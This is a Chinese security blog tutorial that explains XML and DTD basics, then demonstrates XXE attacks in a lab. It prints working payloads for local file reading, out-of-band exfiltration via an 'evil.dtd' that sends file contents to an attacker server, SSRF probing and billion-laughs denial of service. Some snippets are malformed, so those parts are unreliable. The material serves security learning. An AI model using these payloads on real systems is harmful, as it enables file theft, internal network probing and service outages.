---
title: XML 基础 & XXE漏洞
published: 2025-03-09 16:44:04
tags: [WEB安全,通用漏洞]
category: 安全
draft: false
---

# XML 基础 & XXE漏洞

> XML 外部实体注入（也称为 `XXE`）是一种 `Web` 安全漏洞，允许攻击者干扰应用程序对 `XML` 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互
> 

> 好文：https://www.cnblogs.com/20175211lyz/p/11413335.html
> 

## XML 基础

### 什么是XML？

XML 是可拓展标记语言（`EXtensible Markup Language`）

XML 设计宗旨是用来传输数据，而不是查看数据

XML 是`W3C`推荐标准

XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息

XML 语言没有预定义的标签

### XML基本格式和语法

```c
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
<bookstore>                                                 <!--根元素-->
<book category="COOKING">        <!--bookstore的子元素，category为属性-->
<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
<author>Giada De Laurentiis</author>                  <!--book的子元素-->
<year>2005</year>                                     <!--book的子元素-->
<price>30.00</price>                                  <!--book的子元素-->
</book>                                                 <!--book的结束-->
</bookstore>                                       <!--bookstore的结束-->
```

`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` 成为`XML prolog`，用于声明XML编码格式和版本，是可选的，必须放在文档的开头

`standalone` 值是yes的时候表示`DTD`仅用于验证文档结构，从而外部实体被禁用（`XXE`外部实体攻击失效），但是它的默认值是`no`,而且一写解析器会直接忽略这一项

### XML语法

- 所有 XML 元素都须有关闭标签
- XML 标签对大小写敏感
- XML 必须正确地嵌套
- XML 文档必须有根元素
- XML 的属性值须加引号

## DTD 基础

### DTD 概念

XML文档有自己的一个格式规范，这个格式规范有一个叫DTD（`document type definition`）的东西控制

可以嵌入到XML文档中（内部实体），也可以独立放在另外一个的文件中（外部引用）

用来说明哪些元素是合法的以及元素间要怎么嵌套/结合

### 实体引用

XML元素以形如 `<tag>foo</tag>` 的标签开始和结束
如果元素内部出现如`<` 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用`&lt; &gt; &amp; &apos; &quot;` 替换 `< > & ' "`

### DTD 的引用方式

1. 内部实体，即将约束规则定义到`XML`文档中
    
    ```c
    <!DOCTYPE 根元素名称 [元素声明]>
    ```
    
    ```c
    <?xml version="1.0"?>
    <!DOCTYPE note [ <!--定义此文档是 note 类型的文档-->
    <!ELEMENT note (to,from,heading,body)> <!--定义note元素有四个元素-->
    <!ELEMENT to (#PCDATA)> <!--定义to元素为”#PCDATA”类型-->
    <!ELEMENT from (#PCDATA)> <!--定义from元素为”#PCDATA”类型-->
    <!ELEMENT head (#PCDATA)> <!--定义head元素为”#PCDATA”类型-->
    <!ELEMENT body (#PCDATA)> <!--定义body元素为”#PCDATA”类型-->
    ]>
    <note>
    <to>Y0u</to>
    <from>@re</from>
    <head>v3ry</head>
    <body>g00d!</body>
    </note>
    ```
    
2. 外部实体，引用外部`DTD`文件
    - 引入外部`dtd`文件
        
        ```c
        *<!DOCTYPE 根元素名称 SYSTEM "dtd路径">*
        ```
        
    - 引入外部`dtd`文件（网络）
        
        ```c
        <!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">
        ```
        

### DTD 实体

*按实体有无参分类，实体分为一般实体和参数实体*

1. 内部实体
    
    ```c
    <!DOCTYPE note [
        <!ENTITY a "admin">
    ]>
    <note>&a</note>
    <!-- admin -->
    ```
    
2. 参数实体
    
    ```c
    <!DOCTYPE note> [
        <!ENTITY % b "<!ENTITY b1 "awsl">">
        %b;
    ]>
    <note>&b1</note>
    <!-- awsl -->
    ```
    
    参数实体用**`% name`**申明，引用时用**`%name;`**，只能在DTD中申明，DTD中引用。
    
    其余实体直接用**`name`**申明，引用时用**`&name;`**，只能在DTD中申明，可在xml文档中引用
    
3. 外部实体（使用了PHP伪协议）
    
    ```c
    <!DOCTYPE note> [
        <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
    ]>
    <note>&c</note>
    <!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->
    ```
    
4. 外部参数实体
    
    ```c
    <!DOCTYPE note> [
        <!ENTITY % d SYSTEM "http://47.106.143.26/xml.dtd">
        %d;
    ]>
    <note>&d1</note>
    <!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->
    ```
    
    ```c
    # http://47.106.143.26/xml.dtd
    <!-- http://47.106.143.26/xml.dtd -->
    <!ENTITY d1 SYSTEM "data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==">
    ```
    

## XXE 漏洞

### XXE 检测

- 迪总思路
    
    XXE黑盒发现:
    
    1、获取得到`Content-Type`或数据类型为`xml`时，尝试进行`xml`语言`payload`进行测试
    
    2、不管获取的`Content-Type`类型或数据传输类型，均可尝试修改后提交测试`xxe`
    
    3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的`XXE Payload`被执行
    
    XXE白盒发现:可通过应用功能追踪代码定位审计，可通过脚本特定函数搜索定位审计，可通过伪协议玩法绕过相关修复等
    
- 主要的方法是检测所有接收`XML`作为输入的内容端点，抓包观察是否是我们想要的内容
    
    首先检测XML是否会被成功解析，看数据包是否会带有`Hello XXE`字样
    
    ```python
    <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE ANY [ <!ENTITY words "Hello XXE !">]><root>&words;</root>
    ```
    
    然后检测改端点是否支持`DTD`引用外部实体，带外测试，可以使用dnslog来测试
    
    ```python
    <?xml version=”1.0” encoding=”UTF-8”?><!DOCTYPE ANY [<!ENTITY % name SYSTEM "http://localhost/tp5/test.xml">%name;]>
    ```
    

## XML外部实体注入

一般`xxe`利用分为两大场景：有回显和无回显，无回显也是`Blind XXE`

下面均使用`xxe-lab` 来测试（测试`PHP` 版本的，其他语言后边再补）

### 探测是否存在 XXE

- 有回显
    1. 登录框账号密码随便输入（这里账号密码都是`admin`），然后抓包，可以发现请求传输的是`XML` ，我们测试一下有没有回显
        
        ```c
        POST /php_xxe/doLogin.php HTTP/1.1
        Host: 192.168.111.154
        Accept: application/xml, text/xml, */*; q=0.01
        Content-Type: application/xml;charset=utf-8
        X-Requested-With: XMLHttpRequest
        
        <user>
        	<username>admin</username>
        	<password>admin</password>
        </user>
        ```
        
    2. 内部实体测试是否有回显，将请求包（`req`）修改为如下，如何发送
        
        ```c
        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE username [
            <!ENTITY admin "有回显">
        ]>
        <user>
        	<username>&admin;</username>
        	<password>admin</password>
        </user>
        ```
        
        我们再看响应包，有回显，存在`XXE`漏洞！！
        
        ![image.png](image%2016.png)
        
- 无回显
    1. 假如测试之后**没有回显**，我们尝试外带测试是否存在`xxe`漏洞，通过`Blind XXE` 方法，这里使用`Dnslog`来进行外带测试，将测试链接修改后，发包
        
        ![image.png](image%2017.png)
        
        ```c
        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE username [
            <!ENTITY admin SYSTEM "http://98848113.log.dnslog.sbs">
        ]>
        <user>
        	<username>&admin;</username>
        	<password>admin</password>
        </user>
        ```
        
    2. 此时因为返回包无回显，所以看`Dnslog`，点击`get results` ，成功请求了测试链接，存在`XXE`漏洞！！！
        
        ![image.png](image%2018.png)
        

### XXE 文件读取 - 有回显

- 有回显 - 直接读取（理想状态下）
    
    ```c
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE XXE-test [
        <!ENTITY admin SYSTEM "file:///C:/windows/win.ini">
    ]>
    <user>
    	<username>&admin;</username>
    	<password>admin</password>
    </user>
    ```
    
    ![image.png](image%2019.png)
    
- 有回显 - 恶意引用外部参数实体
    
    `192.168.111.159`为恶意服务器
    
    ```c
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE XXE-test [
        		<!ENTITY % file SYSTEM "http://192.168.111.159/hack.dtd">
    				%file;
    ]>
    <user>
    	<username>&hhh;</username>
    	<password>admin</password>
    </user>
    ```
    
    ```c
    # hack.dtd
    <!ENTITY hhh SYSTEM 'file:///c:/2.txt'>
    ```
    
    ![image.png](image%2020.png)
    

### XXE 文件读取 - 无回显

- 无回显 - OOB
    
    当我们探测到对方主机存在`XXE`漏洞，但是无回显又想去读取文件时，我们可以通过将内容以`http`请求发送到恶意主机,然后恶意主机接收
    
    ```c
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE XXE-test [
        		<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/2.txt">
        		<!ENTITY % dtd SYSTEM "http://192.168.111.159/evil.dtd">
    				%dtd;
    				%send;
    ]>
    <user>
    	<username>admin</username>
    	<password>admin</password>
    </user>
    ```
    
    内部的`%`号要进行**`XML`实体编码**成`&#x25`
    
    ```c
    # evil.dtd
    <!ENTITY % 
    	 "<!ENTITY &#x25; send SYSTEM 'http://192.168.111.159/getdata.php?data=%file;'>"
    >
    %all;
    ```
    
    ```c
    # getdata.php-仅供参考
    <?php
    $data = $_GET['data'];
    $myfile = fopen("xxe-data.txt","w");
    fwrite($myfile,$data);
    fclose($myfile);
    ?>
    ```
    
- 无回显 - 基于报错
    
    和上边的做法几乎一样，不一样就只有将数据带出来的方式，所以我们只要修改`evil.dtd`文件，将访问`url`修改为错误不存在的`url`
    
    ```c
    # evil.dtd
    <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.111.159/ghhhhhh.php?data=%file;'>" 
    >
    %all;
    ```
    
    可以看到内容已经被带出来了
    
    ![image.png](image%2021.png)
    

## XXE - SSRF

一般是用来探测内网存活主机，也就是内网探测

把下面的地址换成自己想要探测的地址，以探测内网主机（但是对方主机没开启`80`端口也无效了）

```c
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE XXE-test [
    <!ENTITY admin SYSTEM "http://192.168.111.159/1.txt">
]>
<user>
	<username>&admin;</username>
	<password>admin</password>
</user>
```

## XXE Dos 攻击

```c
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

此测试可以在内存中将小型 `XML`文档扩展到超过 `3GB` 而使服务器崩溃，如果对方服务器还是`unix`类，那么可以

```c
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

由于 `/dev/random` 是一个设备文件，它可能消耗大量系统资源，导致程序或服务挂起，因为读取大量的随机数据可能需要很长时间，尤其是在没有足够系统熵时

## XXE RCE

这种情况很少发生，这主要是服务配置不当所造成的。如果足够幸运，并且`PHP expect` 模块被加载到易受攻击的系统或者处理`XML`的内部应用程序中，那么我们将可以执行命令

```c
// 没写
```

## XXE 复现

### PHP_XXE（有回显）

**libxml 2.8.0**

1. 抓包尝试发现传输的是xml数据
    
    ![image.png](image%2022.png)
    
2. 直接插入尝试获取数据（假设E盘有1.txt文件，并且内容是 `this is 1.txt`）
    
    ![image.png](image%2023.png)
    
3. 截取请求，响应
    
    ![image.png](image%2024.png)
    
4. 为什么能现实呢？
    
    看源代码
    
    ![image.png](image%2025.png)